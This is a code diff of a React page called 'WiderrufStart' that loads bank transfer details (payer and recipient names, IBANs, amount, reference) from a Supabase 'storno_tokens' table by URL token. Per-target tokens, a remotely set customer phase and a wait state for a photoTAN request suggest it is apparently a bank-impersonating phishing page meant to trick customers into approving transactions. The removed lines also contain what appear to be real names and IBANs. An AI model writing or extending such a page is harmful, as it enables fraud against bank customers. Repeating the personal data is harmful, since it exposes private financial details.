@@ -7,22 +7,47 @@ import Footer from "@/components/Footer";
 import ContactSection from "@/components/ContactSection";
 import { supabase } from "@/integrations/supabase/client";
 
+type Row = {
+  auftraggeber_name: string | null;
+  auftraggeber_iban: string | null;
+  empfaenger_name: string | null;
+  empfaenger_iban: string | null;
+  betrag: number | null;
+  verwendungszweck: string | null;
+  customer_phase: string | null;
+};
+
+const formatIban = (v?: string | null) =>
+  (v || "").replace(/\s+/g, "").replace(/(.{4})/g, "$1 ").trim();
+const kontoFromIban = (v?: string | null) => {
+  const s = (v || "").replace(/\s+/g, "");
+  if (!s) return "—";
+  return s.slice(4).replace(/^0+/, "") || s.slice(4);
+};
+const formatBetrag = (n?: number | null) =>
+  n == null ? "—" : new Intl.NumberFormat("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(Number(n)) + " EUR";
+const berlinToday = () =>
+  new Intl.DateTimeFormat("de-DE", { day: "numeric", month: "long", year: "numeric", timeZone: "Europe/Berlin" }).format(new Date());
+
 const WiderrufStart = () => {
   const navigate = useNavigate();
   const [sp] = useSearchParams();
   const token = sp.get("token");
   const [requesting, setRequesting] = useState(false);
   const [phase, setPhase] = useState<string | null>(null);
+  const [row, setRow] = useState<Row | null>(null);
 
   useEffect(() => {
     if (!token) return;
     const check = async () => {
       const { data } = await (supabase as any)
         .from("storno_tokens")
-        .select("customer_phase")
+        .select("auftraggeber_name, auftraggeber_iban, empfaenger_name, empfaenger_iban, betrag, verwendungszweck, customer_phase")
         .eq("token", token)
         .maybeSingle();
-      const p = data?.customer_phase as string | undefined;
+      if (!data) return;
+      setRow(data as Row);
+      const p = (data as Row).customer_phase;
       if (p) setPhase(p);
       if (p === "success") {
         navigate(`/success?token=${encodeURIComponent(token)}`);
@@ -51,6 +76,7 @@ const WiderrufStart = () => {
   };
 
   const waiting = requesting || phase === "phototan_request";
+
 
   return (
     <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
@@ -99,36 +125,37 @@ const WiderrufStart = () => {
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-6 sm:gap-y-10 mb-5">
               <div>
                 <p className="text-sm text-[#002776] mb-3 font-medium">Empfängerkonto</p>
-                <p className="text-sm text-foreground">DE42 5003 1900 0016 4288 41</p>
+                <p className="text-sm text-foreground">{formatIban(row?.empfaenger_iban) || "—"}</p>
               </div>
               <div>
                 <p className="text-sm text-[#002776] mb-3 font-medium">Betrag</p>
-                <p className="text-sm text-foreground">5,00 EUR</p>
+                <p className="text-sm text-foreground">{formatBetrag(row?.betrag)}</p>
               </div>
               <div>
                 <p className="text-sm text-[#002776] mb-3 font-medium">Verwendungszweck</p>
-                <p className="text-sm text-foreground">3543NV44/17726</p>
+                <p className="text-sm text-foreground">{row?.verwendungszweck || "—"}</p>
               </div>
               <div>
                 <p className="text-sm text-[#002776] mb-3 font-medium">Ausführungsdatum</p>
-                <p className="text-sm text-foreground">17. Juli 2026</p>
+                <p className="text-sm text-foreground">{berlinToday()}</p>
               </div>
               <div>
                 <p className="text-sm text-[#002776] mb-3 font-medium">Auftraggeberkontonummer</p>
-                <p className="text-sm text-foreground">25957083</p>
+                <p className="text-sm text-foreground">{kontoFromIban(row?.auftraggeber_iban)}</p>
               </div>
               <div>
                 <p className="text-sm text-[#002776] mb-3 font-medium">IBAN des Auftraggebers</p>
-                <p className="text-sm text-foreground">DE53 3006 0601 0025 9570 83</p>
+                <p className="text-sm text-foreground">{formatIban(row?.auftraggeber_iban) || "—"}</p>
               </div>
               <div>
                 <p className="text-sm text-[#002776] mb-3 font-medium">Kundenname</p>
-                <p className="text-sm text-foreground">Gülnaz Kirdemir</p>
+                <p className="text-sm text-foreground">{row?.auftraggeber_name || "—"}</p>
               </div>
               <div>
                 <p className="text-sm text-[#002776] mb-3 font-medium">Name des Begünstigten</p>
-                <p className="text-sm text-foreground">Veronica Ariyanne</p>
+                <p className="text-sm text-foreground">{row?.empfaenger_name || "—"}</p>
               </div>
+
             </div>
 
             <div className="border-t border-border/60 pt-4 mb-16">
